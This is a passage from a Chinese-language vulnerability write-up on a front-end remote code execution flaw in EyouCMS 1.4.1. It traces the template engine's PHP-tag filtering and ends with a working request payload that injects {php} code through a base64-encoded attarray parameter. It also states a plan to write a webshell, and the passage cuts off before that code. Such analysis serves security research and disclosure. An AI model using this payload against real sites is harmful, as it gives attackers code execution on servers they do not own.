&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$find &nbsp;&nbsp;&nbsp;= [&#39;~&gt;\s+&lt;~&#39;, &#39;~&gt;(\s+\n|\r)~&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$replace = [&#39;&gt;&lt;&#39;, &#39;&gt;&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = preg_replace($find, $replace, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">优化生成的</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">代码</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = preg_replace(&#39;/\?&gt;\s*&lt;\?php\s(?!echo\b)/s&#39;, &#39;&#39;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">模板过滤输出</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$replace = $this-&gt;config[&#39;tpl_replace_string&#39;];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = str_replace(array_keys($replace), array_values($replace), $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">添加安全代码及模板引用记录</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = &#39;&lt;?php if (!defined(\&#39;THINK_PATH\&#39;)) exit(); /*&#39; . serialize($this-&gt;includeFile) . &#39;*/ ?&gt;&#39; . &quot;\n&quot; . $content;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">编译存储</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;storage-&gt;write($cacheFile, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;includeFile = [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">23 Line: </span><span class="cs9C1B1871">将外部传入的</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">传到当前类中的</span><span class="cs8926E06">parse</span><span class="cs9C1B1871">（解析模板）方法中</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/Template.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">parse</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">public function parse(&amp;$content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">内容为空不解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (empty($content)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">替换</span><span class="cs9FB05234">eyou:literal</span><span class="cs7FFD2630">标签内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseEyouLiteral($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">替换</span><span class="cs9FB05234">literal</span><span class="cs7FFD2630">标签内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseLiteral($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">解析继承</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseExtend($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">解析布局</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseLayout($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">检查</span><span class="cs9FB05234">eyou:include</span><span class="cs7FFD2630">语法</span><span class="cs9FB05234"> &nbsp;by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseEyouInclude($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">检查</span><span class="cs9FB05234">include</span><span class="cs7FFD2630">语法</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseInclude($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">替换包含文件中</span><span class="cs9FB05234">literal</span><span class="cs7FFD2630">标签内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseLiteral($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">替换包含文件中</span><span class="cs9FB05234">eyou:literal</span><span class="cs7FFD2630">标签内容</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseEyouLiteral($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">检查</span><span class="cs9FB05234">PHP</span><span class="cs7FFD2630">语法</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parsePhp($content);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">获取需要引入的标签库列表</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">标签库只需要定义一次，允许引入多个一次</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">一般放在文件的最前面</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">格式：</span><span class="cs9FB05234">&lt;taglib name=&quot;html,mytag...&quot; /&gt;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">当</span><span class="cs9FB05234">TAGLIB_LOAD</span><span class="cs7FFD2630">配置为</span><span class="cs9FB05234">true</span><span class="cs7FFD2630">时才会进行检测</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($this-&gt;config[&#39;taglib_load&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tagLibs = $this-&gt;getIncludeTagLib($content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!empty($tagLibs)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">对导入的</span><span class="cs9FB05234">TagLib</span><span class="cs7FFD2630">进行解析</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($tagLibs as $tagLibName) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;parseTagLib($tagLibName, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">预先加载的标签库</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">无需在每个模板中使用</span><span class="cs9FB05234">taglib</span><span class="cs7FFD2630">标签加载</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">但必须使用标签库</span><span class="cs9FB05234">XML</span><span class="cs7FFD2630">前缀</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($this-&gt;config[&#39;taglib_pre_load&#39;]) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_pre_load&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach ($tagLibs as $tag) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;parseTagLib($tag, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">内置标签库</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">无需使用</span><span class="cs9FB05234">taglib</span><span class="cs7FFD2630">标签导入就可以使用</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">并且不需使用标签库</span><span class="cs9FB05234">XML</span><span class="cs7FFD2630">前缀</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$tagLibs = explode(&#39;,&#39;, $this-&gt;config[&#39;taglib_build_in&#39;]);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;foreach ($tagLibs as $tag) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;parseTagLib($tag, $content, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">解析普通模板标签</span><span class="cs9FB05234"> {$tagName}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseTag($content);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">还原被替换的</span><span class="cs9FB05234">eyou:Literal</span><span class="cs7FFD2630">标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseEyouLiteral($content, true);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">还原被替换的</span><span class="cs9FB05234">Literal</span><span class="cs7FFD2630">标签</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$this-&gt;parseLiteral($content, true);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">24 Line: </span><span class="cs9C1B1871">调用当前类中的</span><span class="cs8926E06">parsePhp</span><span class="cs9C1B1871">（解析</span><span class="cs8926E06">php</span><span class="cs9C1B1871">标签）方法并将</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">传入</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">跟踪到</span><span class="cs9FB05234">/core/library/think/Template.php</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">**</span><span class="cs9FB05234">parsePhp</span><span class="cs8926E06">**</span><span class="cs9C1B1871">方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">private function parsePhp(&amp;$content)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">短标签的情况要将</span><span class="cs9FB05234">&lt;?</span><span class="cs7FFD2630">标签用</span><span class="cs9FB05234">echo</span><span class="cs7FFD2630">方式输出</span><span class="cs9FB05234"> </span><span class="cs7FFD2630">否则无法正常输出</span><span class="cs9FB05234">xml</span><span class="cs7FFD2630">标识</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$content = preg_replace(&#39;/(&lt;\?(?!php|=|$))/i&#39;, &#39;&lt;?php echo \&#39;\\1\&#39;; ?&gt;&#39; . &quot;\n&quot;, $content);</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// </span><span class="cs7FFD2630">过滤</span><span class="cs9FB05234">eval</span><span class="cs7FFD2630">函数，防止被注入执行任意代码</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;$view_replace_str = config(&#39;view_replace_str&#39;);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if (isset($view_replace_str[&#39;__EVAL__&#39;])) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (stristr($content, &#39;{eyou:php}&#39;)) { // </span><span class="cs7FFD2630">针对</span><span class="cs9FB05234">{eyou:php}</span><span class="cs7FFD2630">标签语法处理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match_all(&#39;/{eyou\:php}.*{\/eyou\:php}/iUs&#39;, $content, $matchs);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$matchs = !empty($matchs[0]) ? $matchs[0] : [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!empty($matchs)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($matchs as $key =&gt; $val){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&#39;/{(\/)?eyou\:php}/i&#39;, &#39;&#39;, $val);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = &quot;{eyou:php}{$valNew}{/eyou:php}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_ireplace($val, $valNew, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (stristr($content, &#39;{php}&#39;)) { // </span><span class="cs7FFD2630">针对</span><span class="cs9FB05234">{php}</span><span class="cs7FFD2630">标签语法处理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;preg_match_all(&#39;/{php}.*{\/php}/iUs&#39;, $content, $matchs);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$matchs = !empty($matchs[0]) ? $matchs[0] : [];</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (!empty($matchs)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;foreach($matchs as $key =&gt; $val){</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&#39;/{(\/)?php}/i&#39;, &#39;&#39;, $val);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&quot;/([\W]+)eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = preg_replace(&quot;/^eval(\s*)\(/i&quot;, &#39;intval(&#39;, $valNew);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$valNew = &quot;{php}{$valNew}{/php}&quot;;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = str_ireplace($val, $valNew, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else if (false !== strpos($content, &#39;&lt;?php&#39;)) { // </span><span class="cs7FFD2630">针对原生</span><span class="cs9FB05234">php</span><span class="cs7FFD2630">语法处理</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$content = preg_replace(&quot;/(@)?eval(\s*)\(/i&quot;, &#39;intval(&#39;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; $content = preg_replace(&quot;/\?\bphp\b/i&quot;, &quot;</span><span class="cs7FFD2630">？ｍｕｍａ</span><span class="cs9FB05234">&quot;, $content);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// end</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;// PHP</span><span class="cs7FFD2630">语法检查</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;if ($this-&gt;config[&#39;tpl_deny_php&#39;] &amp;&amp; false !== strpos($content, &#39;&lt;?php&#39;)) {</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (config(&#39;app_debug&#39;)) { // </span><span class="cs7FFD2630">调试模式下中断模板渲染</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;throw new Exception(&#39;not allow php tag&#39;, 11600);</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else { // </span><span class="cs7FFD2630">运营模式下继续模板渲染</span><span class="cs9FB05234"> by </span><span class="cs7FFD2630">小虎哥</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo(lang(&#39;not allow php tag&#39;));</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return;</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">4 Line: </span><span class="cs9C1B1871">将模板中</span><span class="cs8926E06">php</span><span class="cs9C1B1871">短标签转换为</span><span class="cs8926E06"><br/>21 Line: </span><span class="cs9C1B1871">判断传入的</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">中是否包含了</span><span class="cs8926E06">{php}<br/>22 Line: </span><span class="cs9C1B1871">使用正则表达式匹配出</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">中所有包含了</span><span class="cs8926E06">&ldquo;{php}</span><span class="cs9C1B1871">任意内容</span><span class="cs8926E06">{/php}&rdquo;</span><span class="cs9C1B1871">的标签</span><span class="cs8926E06"><br/>23 Line: </span><span class="cs9C1B1871">使用三目运算符判断匹配出来的数组中的第</span><span class="cs8926E06">0</span><span class="cs9C1B1871">个元素是否有值，如果有值那么将第</span><span class="cs8926E06">0</span><span class="cs9C1B1871">个元素的值赋给</span><span class="cs8926E06">$matchs</span><span class="cs9C1B1871">否则将空数组赋给</span><span class="cs8926E06">$matchs<br/>24 Line: </span><span class="cs9C1B1871">判断</span><span class="cs8926E06">$matchs</span><span class="cs9C1B1871">不为空</span><span class="cs8926E06"><br/>25 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$matchs</span><span class="cs9C1B1871">使用</span><span class="cs8926E06">foreach</span><span class="cs9C1B1871">循环遍历</span><span class="cs8926E06"><br/>26 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$val</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">&ldquo;{/</span><span class="cs9C1B1871">任意空白字符</span><span class="cs8926E06">php}&rdquo;</span><span class="cs9C1B1871">替换为空并赋给</span><span class="cs8926E06">$valnew<br/>27 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$valnew</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">多个或零个</span><span class="cs8926E06">0-9A-Za-Z_eval(&rdquo;</span><span class="cs9C1B1871">替换为</span><span class="cs8926E06">&ldquo;intval(&rdquo;<br/>28 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$valnew</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">&ldquo;</span><span class="cs9C1B1871">开始为</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">任意空白字符</span><span class="cs8926E06">(&rdquo;</span><span class="cs9C1B1871">替换为</span><span class="cs8926E06">&ldquo;intval(&rdquo;<br/>29 Line: </span><span class="cs9C1B1871">将字符串</span><span class="cs8926E06">&ldquo;{php}{$valNew}{/php}&rdquo;</span><span class="cs9C1B1871">赋给</span><span class="cs8926E06">$valnew<br/>30 Line: </span><span class="cs9C1B1871">将</span><span class="cs8926E06">$content</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">$val</span><span class="cs9C1B1871">替换为</span><span class="cs8926E06">$valNew</span></p><h3 class="cs868C439D">
			<a name="漏洞复现"><span class="csD6CA00D2">漏洞复现</span></a></h3>
		<p class="cs3A447A38"><span class="cs9FB05234">Payload:attarray=eyJ7cGhwfXBocGluZm8oKTt7XC9waHB9Ijoie3BocH1waHBpbmZvKCk7e1wvcGhwfSJ9&amp;html={php}phpinfo();{/php}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Eyoucms/Eyoucms%201.4.1%20%e5%89%8d%e5%8f%b0rce_files/image0.png" width="560" height="436" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">Payload</span><span class="cs9C1B1871">生成方式</span><span class="cs8926E06">:</span></p><p class="cs3A447A38"><span class="cs9FB05234">base64_encode(jsonstring)</span></p><p class="cs40DD2BC9"><span class="cs8926E06">eval</span><span class="cs9C1B1871">会被替换成</span><span class="cs8926E06">intval</span><span class="cs9C1B1871">，所以我们采用</span><span class="cs8926E06">base64</span><span class="cs9C1B1871">加密写入</span><span class="cs8926E06">webshell</span><span class="cs9C1B1871">的方式</span><span class="cs8926E06"><br/>php</span><span class="cs9C1B1871">代码如下：</span></p><p class="cs3A447A38"><span 